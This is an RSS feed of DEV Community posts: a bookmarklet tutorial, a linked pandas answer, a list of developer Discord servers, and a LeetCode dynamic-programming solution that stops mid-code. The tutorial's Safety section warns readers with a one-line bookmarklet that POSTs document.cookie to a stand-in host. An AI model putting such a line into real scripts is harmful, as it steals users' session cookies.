<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>On bookmarklets and how to make them</title>
      <author>Siddharth</author>
      <pubDate>Thu, 24 Jun 2021 09:37:51 +0000</pubDate>
      <link>https://dev.to/siddharthshyniben/on-bookmarklets-and-how-to-make-them-45cd</link>
      <guid>https://dev.to/siddharthshyniben/on-bookmarklets-and-how-to-make-them-45cd</guid>
      <description>&lt;h3&gt;
  &lt;a href="#bookmarklets-are-bookmarks-which-execute-javascript-instead-of-opening-a-new-page-they-are-available-in-almost-every-browser-including-chrome-firefox-and-most-chromium-based-browsers"&gt;
  &lt;/a&gt;
  Bookmarklets are bookmarks which execute javascript instead of opening a new page. They are available in almost every browser, including Chrome, Firefox and most Chromium based browsers
&lt;/h3&gt;

&lt;p&gt;They are pretty easy to make, and can do almost everything, including injecting other scripts, interacting with the DOM, and absolutely everything you can do with JavaScript.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#how-to-make-a-bookmarklet"&gt;
  &lt;/a&gt;
  How to make a bookmarklet
&lt;/h2&gt;

&lt;p&gt;That's pretty easy, just create a bookmark (using whatever method your browser has) with the following content:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;javascript&lt;/span&gt;&lt;span class="p"&gt;:(()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="cm"&gt;/* Your code goes here */&lt;/span&gt;&lt;span class="p"&gt;})();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The &lt;code&gt;javascript:&lt;/code&gt; part tells the browser that the bookmark is actually javascript which is to be executed.&lt;/p&gt;

&lt;p&gt;The rest of the code is executed as normal, but you can make it an IIFE (Immediately-Invoked Function Expression) so that you don't accidentally overwrite any variables already defined. The code can be whatever you like, but on some sites (like GitHub) some action may be blocked (like injecting scripts)&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--JvyE2kl0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4ncx987kc4xjr5j9togr.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--JvyE2kl0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4ncx987kc4xjr5j9togr.png" alt="Screen Shot 2021-06-21 at 9.33.18 AM"&gt;&lt;/a&gt;&lt;/p&gt;
I can't inject jQuery!!



&lt;p&gt;Another neat trick is that if you make the bookmarklet return any HTML, the content of the current page will be overwritten with the HTML! (which is perfect if you want a random xkcd fetcher)&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#sharing-bookmarklets"&gt;
  &lt;/a&gt;
  Sharing bookmarklets
&lt;/h2&gt;

&lt;p&gt;It's pretty annoying to have to copy the code for a bookmarklet if you want to use it yourself, right!&lt;/p&gt;

&lt;p&gt;Well, &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Bookmarklets are just URLs&lt;/li&gt;
&lt;li&gt;URLs can be added to the &lt;code&gt;href&lt;/code&gt; of a link&lt;/li&gt;
&lt;li&gt;A link can be bookmarked (right click or drag to bookmarks bar)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So, if you want to put a shareable bookmark on a website, just make an &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; element with the &lt;code&gt;href&lt;/code&gt; set to whatever code&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;"javascript:(()=&amp;gt;{alert('Hello, World!'); })();"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Bookmark me&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Unfortunately, I can't seem to be able to add bookmarklets over here, so here's a pen with the output:&lt;/p&gt;

&lt;p&gt;&lt;iframe height="600" src="https://codepen.io/SiddharthShyniben/embed/XWMLvYy?height=600&amp;amp;default-tab=html,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;Here's some more bookmarklets which you could use:&lt;/p&gt;

&lt;p&gt;&lt;iframe height="600" src="https://codepen.io/SiddharthShyniben/embed/BaWgXOW?height=600&amp;amp;default-tab=result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#safety"&gt;
  &lt;/a&gt;
  Safety
&lt;/h2&gt;

&lt;p&gt;Bookmarklets are equal to running scripts on a page, so you have to be really careful with them.&lt;/p&gt;

&lt;p&gt;For example, this bookmarklet could easily read cookies and post them somewhere:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;javascript&lt;/span&gt;&lt;span class="p"&gt;:(()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;http://cookiesnatchers.com?cookie=&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="na"&gt;method&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;POST&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;})();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Once again, you have to be really careful about what bookmarklets do. &lt;/p&gt;

&lt;p&gt;Thanks for reading! If you have any nice bookmarklets, please share them down below! &lt;/p&gt;

</description>
      <category>javascript</category>
      <category>tutorial</category>
    </item>
    <item>
      <title>Answer: Construct pandas DataFrame from items in nested dictionary</title>
      <author>Vicky Kumar</author>
      <pubDate>Thu, 24 Jun 2021 09:25:18 +0000</pubDate>
      <link>https://dev.to/imvickykumar999/answer-construct-pandas-dataframe-from-items-in-nested-dictionary-754</link>
      <guid>https://dev.to/imvickykumar999/answer-construct-pandas-dataframe-from-items-in-nested-dictionary-754</guid>
      <description>&lt;div class="ltag__stackexchange--container"&gt;
  &lt;div class="ltag__stackexchange--title-container"&gt;
    
      &lt;div class="ltag__stackexchange--title"&gt;
        &lt;h1&gt;
          &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--7Gn-iPj_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/stackoverflow-logo-b42691ae545e4810b105ee957979a853a696085e67e43ee14c5699cf3e890fb4.svg" alt=""&gt;
            &lt;a href="https://stackoverflow.com/questions/13575090/construct-pandas-dataframe-from-items-in-nested-dictionary/13581730#13581730" rel="noopener noreferrer"&gt;
              &lt;span class="title-flare"&gt;answer&lt;/span&gt; re:  Construct pandas DataFrame from items in nested dictionary
            &lt;/a&gt;
        &lt;/h1&gt;
        &lt;div class="ltag__stackexchange--post-metadata"&gt;
          &lt;span&gt;Nov 27 '12&lt;/span&gt;
        &lt;/div&gt;
      &lt;/div&gt;
      &lt;a class="ltag__stackexchange--score-container" href="https://stackoverflow.com/questions/13575090/construct-pandas-dataframe-from-items-in-nested-dictionary/13581730#13581730" rel="noopener noreferrer"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Y9mJpuJP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/stackexchange-arrow-up-eff2e2849e67d156181d258e38802c0b57fa011f74164a7f97675ca3b6ab756b.svg" alt=""&gt;
        &lt;div class="ltag__stackexchange--score-number"&gt;
          153
        &lt;/div&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--wif5Zq3z--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/stackexchange-arrow-down-4349fac0dd932d284fab7e4dd9846f19a3710558efde0d2dfd05897f3eeb9aba.svg" alt=""&gt;
      &lt;/a&gt;
    
  &lt;/div&gt;
  &lt;div class="ltag__stackexchange--body"&gt;
    
&lt;p&gt;A pandas MultiIndex consists of a list of tuples. So the most natural approach would be to reshape your input dict so that its keys are tuples corresponding to the multi-index values you require. Then you can just construct your dataframe using &lt;code&gt;pd.DataFrame.from_dict&lt;/code&gt;, using the option &lt;code&gt;orient='index'&lt;/code&gt;: &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;user_dict&lt;/code&gt;&lt;/pre&gt;…
    
  &lt;/div&gt;
  &lt;div class="ltag__stackexchange--btn--container"&gt;
    
      &lt;a href="https://stackoverflow.com/questions/13575090/construct-pandas-dataframe-from-items-in-nested-dictionary/13581730#13581730" rel="noopener noreferrer"&gt;Open Full Answer&lt;/a&gt;
    
  &lt;/div&gt;
&lt;/div&gt;


&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--I1pxfbyP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/gdxoo6483itemxlsjbnr.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--I1pxfbyP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/gdxoo6483itemxlsjbnr.png" alt="image"&gt;&lt;/a&gt;&lt;/p&gt;

</description>
      <category>imvickykumar999</category>
    </item>
    <item>
      <title>9 Discord server every developer must know!</title>
      <author>Konchada Sai Ansul</author>
      <pubDate>Thu, 24 Jun 2021 09:15:09 +0000</pubDate>
      <link>https://dev.to/saiansulsblog/9-discord-server-every-developer-must-know-1ajp</link>
      <guid>https://dev.to/saiansulsblog/9-discord-server-every-developer-must-know-1ajp</guid>
      <description>&lt;p&gt;Hello Guys, Welcome back to another post of &lt;strong&gt;Sai Ansul's Blog&lt;/strong&gt;. In this blog we are gonna find out 9 more Discord server every developer must know.&lt;/p&gt;

&lt;p&gt;So, let's start These servers are actually helpful, and I have used these servers in the recent time.&lt;/p&gt;

&lt;p&gt;What is Discord ?&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--57QyJuOl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1624471773124/v4FKeThYZ.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--57QyJuOl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1624471773124/v4FKeThYZ.png" alt="image.png"&gt;&lt;/a&gt;&lt;br&gt;
Discord is a community based chatting app that allows you to directly connect with other people within your niche. Although Discord was initially built for gamer, it grew and people from all walks of life started using it to empower their connectivity. One of those communities is obviously the developer’s communities.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#1-techno-wizard"&gt;
  &lt;/a&gt;
  1.  &lt;a href="https://discord.gg/avZUNsdZUQ"&gt;Techno Wizard &lt;/a&gt;
&lt;/h1&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--B-J9KS8d--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1624518118353/IpR0u_D75.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--B-J9KS8d--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1624518118353/IpR0u_D75.gif" alt="LOGO_1.gif"&gt;&lt;/a&gt;&lt;br&gt;
Techno Wizard is a discord server to talk for Lounge, Gaming, Tech Talks, Daily Tech news  and to use a variety of discord bots from currency to music to RPG.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#2-emberjs"&gt;
  &lt;/a&gt;
  2.  &lt;a href="https://discord.gg/emberjs"&gt;EmberJs&lt;/a&gt;
&lt;/h1&gt;

&lt;p&gt;EmberJs is a discord server has many categories where you have different types chats.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#3-jetbrains-community"&gt;
  &lt;/a&gt;
  3. &lt;a href="https://discord.gg/W2wJV48yVw"&gt;JetBrains Community&lt;/a&gt;
&lt;/h1&gt;

&lt;p&gt;It is discord server mainly for your next open-source project, it'll help you to grow.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#4-java"&gt;
  &lt;/a&gt;
  4.  &lt;a href="https://discord.gg/SFxRxAKCQJ"&gt;Java&lt;/a&gt;
&lt;/h1&gt;

&lt;p&gt;It is the official server of Java, where you can find help about Java from various programmers.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#5-ohmyzsh"&gt;
  &lt;/a&gt;
  5.  &lt;a href="https://discord.gg/ohmyzsh"&gt;ohmyzsh&lt;/a&gt;
&lt;/h1&gt;

&lt;p&gt;It is a server where you can have a good time finding new things, so you can also check out it.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#6-microsoft-python"&gt;
  &lt;/a&gt;
  6.  &lt;a href="https://discord.gg/AnppfSyE8g"&gt;Microsoft Python &lt;/a&gt;
&lt;/h1&gt;

&lt;p&gt;It is a official server of Microsoft Python, when you can get in touch with any issues or you keep getting updated on latest launches.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#7-nodeiflux"&gt;
  &lt;/a&gt;
  7.  &lt;a href="https://discord.gg/fYchcs755w"&gt;Nodeiflux&lt;/a&gt;
&lt;/h1&gt;

&lt;p&gt;This server is been focused for node.js mainly, where you can have talks related to Node.js and tech.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#8-android-discord"&gt;
  &lt;/a&gt;
  8.  &lt;a href="https://discord.gg/android"&gt;Android Discord&lt;/a&gt;
&lt;/h1&gt;

&lt;p&gt;In this server you can get support about the technical issues, you can ask for recomendation on your gadgets you wanna buy.     &lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#9-apple-betas"&gt;
  &lt;/a&gt;
  9.  &lt;a href="https://discord.gg/bXTP4Fq9T8"&gt;Apple Betas&lt;/a&gt;
&lt;/h1&gt;

&lt;p&gt;In this server you can ask for beta accesses to the latest updates on IOS .&lt;/p&gt;

&lt;p&gt;This was it for today guys!&lt;/p&gt;

&lt;p&gt;If you think I missed any let me know in the comments below.&lt;/p&gt;

&lt;p&gt;If you want to know more 9 discord server for developers, you can check my previous article on that from  &lt;a href="https://saiansul.hashnode.dev/9-discord-server-every-developer-must-know"&gt;here&lt;/a&gt; .&lt;/p&gt;

&lt;p&gt;If you like my content and want to support my efforts, please like👍🏻, share📲 &amp;amp; subscribe to the newsletter to be get notified whenever I post a new blog.&lt;/p&gt;

</description>
    </item>
    <item>
      <title>Solution: Out of Boundary Paths</title>
      <author>seanpgallivan</author>
      <pubDate>Thu, 24 Jun 2021 09:08:36 +0000</pubDate>
      <link>https://dev.to/seanpgallivan/solution-out-of-boundary-paths-2jef</link>
      <guid>https://dev.to/seanpgallivan/solution-out-of-boundary-paths-2jef</guid>
      <description>&lt;p&gt;&lt;em&gt;This is part of a series of Leetcode solution explanations (&lt;a href="https://dev.to/seanpgallivan/leetcode-solutions-index-57fl"&gt;index&lt;/a&gt;). If you liked this solution or found it useful,&lt;/em&gt; &lt;strong&gt;&lt;em&gt;please like&lt;/em&gt;&lt;/strong&gt; &lt;em&gt;this post and/or&lt;/em&gt; &lt;strong&gt;&lt;em&gt;upvote&lt;/em&gt;&lt;/strong&gt; &lt;em&gt;&lt;a href="https://leetcode.com/problems/out-of-boundary-paths/discuss/1293798"&gt;my solution post on Leetcode's forums&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;




&lt;h4&gt;
  &lt;a href="#leetcode-problem-576-medium-out-of-boundary-paths"&gt;
  &lt;/a&gt;
  &lt;a href="https://leetcode.com/problems/out-of-boundary-paths/"&gt;Leetcode Problem #576 (&lt;em&gt;Medium&lt;/em&gt;): Out of Boundary Paths&lt;/a&gt;
&lt;/h4&gt;




&lt;h4&gt;
  &lt;a href="#description"&gt;
  &lt;/a&gt;
  &lt;strong&gt;&lt;em&gt;Description:&lt;/em&gt;&lt;/strong&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;br&gt;(&lt;em&gt;Jump to&lt;/em&gt;: &lt;a href="#idea"&gt;&lt;em&gt;Solution Idea&lt;/em&gt;&lt;/a&gt; || &lt;em&gt;Code&lt;/em&gt;: &lt;a href="#javascript-code"&gt;&lt;em&gt;JavaScript&lt;/em&gt;&lt;/a&gt; | &lt;a href="#python-code"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; | &lt;a href="#java-code"&gt;&lt;em&gt;Java&lt;/em&gt;&lt;/a&gt; | &lt;a href="#c-code"&gt;&lt;em&gt;C++&lt;/em&gt;&lt;/a&gt;)&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There is an &lt;code&gt;m&lt;/code&gt; x &lt;code&gt;n&lt;/code&gt; grid with a ball. The ball is initially at the position &lt;code&gt;[startRow, startColumn]&lt;/code&gt;. You are allowed to move the ball to one of the four adjacent four cells in the grid (possibly out of the grid crossing the grid boundary). You can apply &lt;strong&gt;at most&lt;/strong&gt; &lt;code&gt;maxMove&lt;/code&gt; moves to the ball.&lt;/p&gt;

&lt;p&gt;Given the five integers &lt;code&gt;m&lt;/code&gt;, &lt;code&gt;n&lt;/code&gt;, &lt;code&gt;maxMove&lt;/code&gt;, &lt;code&gt;startRow&lt;/code&gt;, &lt;code&gt;startColumn&lt;/code&gt;, return the number of paths to move the ball out of the grid boundary. Since the answer can be very large, return it &lt;strong&gt;modulo&lt;/strong&gt; &lt;code&gt;10^9 + 7&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;




&lt;h4&gt;
  &lt;a href="#examples"&gt;
  &lt;/a&gt;
  &lt;strong&gt;&lt;em&gt;Examples:&lt;/em&gt;&lt;/strong&gt;
&lt;/h4&gt;

&lt;blockquote&gt;
&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Example 1:&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Input:&lt;/td&gt;
&lt;td&gt;m = 2, n = 2, maxMove = 2, startRow = 0, startColumn = 0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Output:&lt;/td&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Visual:&lt;/td&gt;
&lt;td&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--HzI-wTTl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://assets.leetcode.com/uploads/2021/04/28/out_of_boundary_paths_1.png" alt="Example 1 Visual"&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;

&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Example 2:&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Input:&lt;/td&gt;
&lt;td&gt;m = 1, n = 3, maxMove = 3, startRow = 0, startColumn = 1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Output:&lt;/td&gt;
&lt;td&gt;12&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Visual:&lt;/td&gt;
&lt;td&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--f1Ado8RN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://assets.leetcode.com/uploads/2021/04/28/out_of_boundary_paths_2.png" alt="Example 1 Visual"&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;
&lt;/blockquote&gt;




&lt;h4&gt;
  &lt;a href="#constraints"&gt;
  &lt;/a&gt;
  &lt;strong&gt;&lt;em&gt;Constraints:&lt;/em&gt;&lt;/strong&gt;
&lt;/h4&gt;

&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;1 &amp;lt;= m, n &amp;lt;= 50&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0 &amp;lt;= maxMove &amp;lt;= 50&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0 &amp;lt;= startRow &amp;lt;= m&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0 &amp;lt;= startColumn &amp;lt;= n&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;




&lt;h4&gt;
  &lt;a href="#idea"&gt;
  &lt;/a&gt;
  &lt;strong&gt;&lt;em&gt;Idea:&lt;/em&gt;&lt;/strong&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;br&gt;(&lt;em&gt;Jump to&lt;/em&gt;: &lt;a href="#description"&gt;&lt;em&gt;Problem Description&lt;/em&gt;&lt;/a&gt; || &lt;em&gt;Code&lt;/em&gt;: &lt;a href="#javascript-code"&gt;&lt;em&gt;JavaScript&lt;/em&gt;&lt;/a&gt; | &lt;a href="#python-code"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; | &lt;a href="#java-code"&gt;&lt;em&gt;Java&lt;/em&gt;&lt;/a&gt; | &lt;a href="#c-code"&gt;&lt;em&gt;C++&lt;/em&gt;&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;A brute force solution for this problem would be far too long since the number of possible paths is &lt;strong&gt;4^maxMove&lt;/strong&gt;. As is the case for most problems that contain overlapping paths, this problem can be simplified by combining these overlapping paths with the help of a &lt;strong&gt;dynamic programming&lt;/strong&gt; (&lt;strong&gt;DP&lt;/strong&gt;) approach.&lt;/p&gt;

&lt;p&gt;In this instance, we can create a DP matrix in which each cell (&lt;strong&gt;dp[d][i][j]&lt;/strong&gt;) represents the solution where &lt;strong&gt;d&lt;/strong&gt; is the number of moves remaining and &lt;strong&gt;i&lt;/strong&gt; and &lt;strong&gt;j&lt;/strong&gt; are the coordinates of the starting location. We can then build this DP matrix up from &lt;strong&gt;d = 1&lt;/strong&gt; all the way up to &lt;strong&gt;d = maxMove&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;To build up &lt;strong&gt;dp&lt;/strong&gt;, we can start by filling in the starting values when &lt;strong&gt;d = 1&lt;/strong&gt;, at which point each of the cells along the edges is a &lt;strong&gt;1&lt;/strong&gt; and each corner is a &lt;strong&gt;2&lt;/strong&gt;. From there, we can iterate through the remaining values for &lt;strong&gt;d&lt;/strong&gt;, and each cell will be the sum of the surrounding four cells from the previous move iteration (&lt;strong&gt;d-1&lt;/strong&gt;), as those cells correspond to the possible previous positions before moving to the current cell.&lt;/p&gt;

&lt;p&gt;Since we want to include any path that doesn't take up the full &lt;strong&gt;maxMove&lt;/strong&gt;, the solution (&lt;strong&gt;ans&lt;/strong&gt;) will then be the sum of the cells in &lt;strong&gt;dp&lt;/strong&gt; that correspond to &lt;strong&gt;i = startRow&lt;/strong&gt; and &lt;strong&gt;j = startColumn&lt;/strong&gt; with all possible values for &lt;strong&gt;d&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;To make things easier by preventing the need for out-of-bounds checks, we can add a buffer row/column on all four sides of the grid representations in &lt;strong&gt;dp&lt;/strong&gt; filled with &lt;strong&gt;0&lt;/strong&gt; values.&lt;/p&gt;

&lt;p&gt;As we only ever use the previous iteration of &lt;strong&gt;d&lt;/strong&gt; to build the current one, we can save space in this solution by compressing &lt;strong&gt;dp&lt;/strong&gt; into only two 2D matrices (&lt;strong&gt;dpCurr, dpLast&lt;/strong&gt;) instead of a 3D matrix of &lt;strong&gt;maxMove&lt;/strong&gt; depth. We can do this by just swapping &lt;strong&gt;dpCurr&lt;/strong&gt; and &lt;strong&gt;dpLast&lt;/strong&gt; between each iteration and overwriting the old values in &lt;strong&gt;dpCurr&lt;/strong&gt; as we iterate through. We can also then keep track of &lt;strong&gt;ans&lt;/strong&gt; as we go.&lt;/p&gt;

&lt;p&gt;We should also not forget to use the &lt;strong&gt;modulo&lt;/strong&gt; operation on each cell value equation.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;em&gt;&lt;strong&gt;Time Complexity: O(N * M * L)&lt;/strong&gt; where &lt;strong&gt;N&lt;/strong&gt; and &lt;strong&gt;M&lt;/strong&gt; are the dimensions of the grid and &lt;strong&gt;L&lt;/strong&gt; is the maximum number of moves&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;strong&gt;Space Complexity: O(N * M)&lt;/strong&gt; for the DP matrices&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;




&lt;h4&gt;
  &lt;a href="#javascript-code"&gt;
  &lt;/a&gt;
  &lt;strong&gt;&lt;em&gt;Javascript Code:&lt;/em&gt;&lt;/strong&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;br&gt;(&lt;em&gt;Jump to&lt;/em&gt;: &lt;a href="#description"&gt;&lt;em&gt;Problem Description&lt;/em&gt;&lt;/a&gt; || &lt;a href="#idea"&gt;&lt;em&gt;Solution Idea&lt;/em&gt;&lt;/a&gt;)&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;findPaths&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;m&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;n&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;maxMove&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;startRow&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;startColumn&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;maxMove&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;dpCurr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Array&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;from&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="na"&gt;length&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;m&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;Uint32Array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;n&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
